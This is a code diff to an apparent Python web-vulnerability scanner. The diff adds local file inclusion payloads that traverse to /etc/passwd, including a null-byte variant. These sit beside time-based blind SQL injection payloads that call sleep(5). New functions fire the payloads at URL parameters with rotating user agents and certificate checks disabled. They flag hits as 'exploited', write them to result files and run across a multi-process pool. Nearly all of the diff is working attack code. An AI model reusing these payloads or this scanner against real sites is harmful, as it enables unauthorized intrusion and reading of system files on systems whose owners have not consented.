@@ -144,27 +144,67 @@ def createSqliUrl(url):
                 with open('sqlscan-v2-results.txt', 'a') as file1:
                     file1.write(newUrl2+"\n")
                 break
-
+            
+            # LFI Payloads for exploiting...
+            lfipayloads = {"../../../../../../etc/passwd","....//....//....//....//....//....//etc//passwd","../../../../../../etc/passwd%00"}
+            # SQLi Payloads for exploiting...
             payloads = ["if(now()=sysdate(),sleep(5),0)", "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
                         "'XOR(if(now()=sysdate(),sleep(5),0))XOR'", "(select(0)from(select(sleep(5)))v)/'+(select(0)from(select(sleep(5)))v)+'\""]
+
             # Check for Blind SQLi, with Payloads.
             for payload in payloads:
                 paramZxploitStr = paramStr+payload
                 zurl = url.replace(paramStr, paramZxploitStr)
                 if(blindSQLi(zurl) == "exploited"):
                     break 
-
+            # Check for Local File Inclusion (LFI), with Payloads.
+            for lpayload in lfipayloads:
+                paramZxploitStr = param[0]+"="+lpayload
+                zurl = url.replace(paramStr, paramZxploitStr)
+                if(getLFI(zurl) == "exploited"):
+                    break 
         except:
             pass
 
 
-def blindSQLi(link):
+def getLFI(link):
+    """
+    This function is created to exploit Local File Inclusion on the Link Provided as paramater
+    """
     try:
         user_agent = random.choice(user_agent_list)
         headers = {'User-Agent': user_agent}
         request = requests.get(link, headers=headers, verify=False)
+        string = "root:x:"
+        error = "include(../etc/passwd)"
+        if error in request.text:
+            print(OKGREEN+"[+LFI+]  "+ENDC+link+OKBLUE+"   Knock, Knock, Knock Neo it's VULNAREBLE..."+ENDC)
+        else:
+            print(FAIL+"[-LFI-]  "+ENDC+link+FAIL+"   NO White Rabbit Found..."+ENDC)
+        if request.status_code == 200 and string in request.text:
+            print(CYAN+"[*LFI*INFO*]  "+ENDC+link+CYAN+"   <ROSE> White Rabbit <ROSE>"+ENDC)
+            with open("lfiResults.txt", "a") as fil:
+                fil.write(link+"\n")
+            return "exploited"
+        else:
+            return "notyet"
+    except KeyboardInterrupt:
+        sys.exit()
+    # except IOError as io:
+    #     print(io)
+    except:
+        pass
+
+def blindSQLi(link):
+    """
+    This function is created to exploit Blind SQL Injection on the Link Provided as paramater
+    """
+    try:
+        user_agent = random.choice(user_agent_list) # Change User Agent at each Request.
+        headers = {'User-Agent': user_agent}
+        request = requests.get(link, headers=headers, verify=False)
         if (request.status_code == 200) and (request.elapsed.total_seconds() >= 5):
-            print(OKBLUE+"[*INFO*]  "+ENDC+link+OKBLUE+"   <ROSE> White Rabbit <ROSE>"+ENDC)
+            print(OKBLUE+"[*BLIND*INFO*]  "+ENDC+link+OKBLUE+"   <ROSE> White Rabbit <ROSE>"+ENDC)
             with open("blindSQLiResults.txt", "a") as fil1:
                 fil1.write(link+"\n")
             return "exploited"
@@ -180,6 +220,9 @@ def blindSQLi(link):
 
 
 def checkSqli(url):
+    """
+    This function is created to check SQL Injection at the url provided as parameter
+    """
     r = requests.get(url, verify=False, timeout=10)
     print(FAIL+"[+]  "+ENDC+url+CYAN +
           "\t<TUNNEL> KNOCK, KNOCK, KNOCK <TUNNEL>"+ENDC)
@@ -227,6 +270,9 @@ def checkSqli(url):
 
 
 def threads():
+    """
+    This function is created to start the Scanner with Multi-Threaded Mapping with a call for createSqliUrl function .
+    """
     try:
         start = timer()
         check = Pool(24)
